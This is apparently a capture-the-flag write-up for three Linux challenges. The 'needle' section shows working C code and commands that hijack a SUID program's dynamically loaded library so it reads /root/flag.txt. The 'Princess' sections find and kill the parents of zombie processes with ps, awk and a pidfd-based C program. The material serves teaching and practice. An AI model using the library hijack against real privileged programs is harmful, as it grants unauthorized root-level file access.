## • needle

Found that `meeting` was a SUID executable and that it dynamically loaded `libmeeting.so` using `dlopen()`

The program searched for a function named `meeting` using `dlsym()` and executed it in a separate thread using `pthread_create()`

The return value of this function was later printed as a string

Created `hermana.c` containing a replacement `meeting()` function that reads the protected flag instead of returning a name, created meeting() that was included in meeting program

```c
#include <stdio.h>
#include <stdlib.h>

void *meeting(void *arg) {
    char *flag = malloc(256);
    if (!flag)
        return NULL;

    FILE *f = fopen("/root/flag.txt", "r");
    if (!f) {
        perror("fopen");
        free(flag);
        return NULL;
    }

    if (!fgets(flag, 256, f)) {
        fclose(f);
        free(flag);
        return NULL;
    }

    fclose(f);
    return flag;
}
```

Compiled the replacement function into a shared library:

```bash
gcc -shared -fPIC -o libmeeting.so hermana.c -lpthread
```

Executed the privileged program, which loaded the library and called the replacement function:

```bash
./meeting
```

The program printed the contents of `/root/flag.txt` instead of the expected name:

```text
Polythread has your concent and name: threadctf{5HO0tiN9_50me_atOMIC_fEE7}
```




# Princess — Threads CTF


## Investigation

Connected to the challenge container using SSH

```bash
ssh d.shestakov-princess@osctf.nnk.moe
```

Inspected the running processes

```bash
ps -eo pid,ppid,stat,cmd
```

The output contained cabin processes and their child princess processes

For example:

```text
PID  PPID  STAT  CMD
9    1     S     the_stone_cabin princess_ash
18   9     Z     [princess_ash] <defunct>
```

The `Z` status indicated that the princess process had already terminated but had not yet been reaped by its parent

Therefore, PID `9` was the cursed cabin that needed to be terminated, rather than PID `18`

## Identifying Cursed Cabins

Used `awk` to select zombie princess processes and extract their parent process IDs

```bash
ps -eo pid,ppid,stat,cmd |
awk '$3 ~ /^Z/ && $4 ~ /princess/ && $2 > 1 {print $2}' | #by this command got pid's of parents of dead princess and these pid's >1
sort -un  #upper is very hard command, innopolis is such a hard place 
```

The command:

Selected processes whose status began with `Z`
Matched princess process names
Extracted their parent PID using `$2`
Excluded PID `1`, which belonged to the main forest process
Removed duplicate parent PIDs using `sort -un`

## Terminating the Cabins

Initially used a loop to repeatedly identify and terminate the parents of zombie princesses

```bash
while true; do
    ps -eo pid,ppid,stat,cmd |
    awk '$3 ~ /^Z/ && $4 ~ /princess/ && $2 > 1 {print $2}' |
    sort -u |
    xargs -r kill
    sleep 0.1
done
```

The forest continued creating new cabins, so process IDs changed during the challenge

To verify which termination signals were successfully sent, used the following command

```bash
ps -eo pid,ppid,stat,cmd |
awk '$3 ~ /^Z/ && $4 ~ /princess/ && $2 > 1 {print $2}' |
sort -un |
xargs -r -n 1 sh -c 'kill "$0" 2>/dev/null && echo "Destroyed cabin PID: $0"'
```

This command attempted to terminate each selected cabin and printed a message when `kill` succeeded


The final command successfully sent termination signals to nine selected cabin processes

The flag was retrieved from the home directory and accepted by the CTF bot

# Princess2

```bash
ssh d.shestakov-princess2@osctf.nnk.moe
nano scout.c
```

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>
#include <signal.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>

static int read_process(pid_t pid, char *name, char *state, pid_t *parent) { //to get information about process
    char path[64], line[512];
    snprintf(path, sizeof(path), "/proc/%ld/status", (long)pid);

    FILE *file = fopen(path, "r");
    if (!file) return 0;

    name[0] = '\0';
    *state = '?';
    *parent = -1;

    int found = 0;
    while (fgets(line, sizeof(line), file)) {
        if (sscanf(line, "Name: %255s", name) == 1) found |= 1;
        else if (sscanf(line, "State: %c", state) == 1) found |= 2;
        else if (sscanf(line, "PPid: %d", parent) == 1) found |= 4;
    }

    fclose(file);
    return found == 7;
}

static int show_flag(void) {
    FILE *file = fopen("/home/ctf/flag.txt", "r");
    if (!file) return 0;

    char line[512];
    while (fgets(line, sizeof(line), file))
        fputs(line, stdout);

    fclose(file);
    return 1;
}

int main(void) {
    for (int round = 0; round < 1200; round++) {
        if (show_flag()) return 0;

        DIR *dir = opendir("/proc");
        if (!dir) return 1;

        struct dirent *entry;

        while ((entry = readdir(dir)) != NULL) {
            if (!isdigit((unsigned char)entry->d_name[0]))
                continue;

            pid_t pid = (pid_t)atoi(entry->d_name);
            char name[256], state;
            pid_t parent;

            if (!read_process(pid, name, &state, &parent))
                continue;

            if (strncmp(name, "princess", 8) != 0 ||
                state != 'Z' || parent <= 1)
                continue;

            int fd = syscall(SYS_pidfd_open, parent, 0);
            if (fd < 0) continue;

            char check_name[256], check_state;
            pid_t check_parent;

            if (read_process(pid, check_name, &check_state,
                             &check_parent) &&
                strncmp(check_name, "princess", 8) == 0 &&
                check_state == 'Z' &&
                check_parent == parent) {

                char cabin[256], cabin_state;
                pid_t cabin_parent;

                if (read_process(parent, cabin, &cabin_state,
                                 &cabin_parent) &&
                    cabin_parent == 1 &&
                    strstr(cabin, "cabin") != NULL &&
                    cabin_state != 'Z') {

                    if (syscall(SYS_pidfd_send_signal,
                                fd, SIGTERM, NULL, 0) == 0)
                        printf("Signal sent to cabin %ld\n",
                               (long)parent);
                }
            }

            close(fd);
        }

        closedir(dir);
        usleep(100000);
    }

    show_flag();
    return 0;
}
```

```bash
gcc -std=gnu11 -O2 -Wall -Wextra scout.c -o scout
./scout
./scout
./scout
./scout
```

Flag file found:
threadctf{i_hOPe_you_can_C_CLeArly_Now}
```
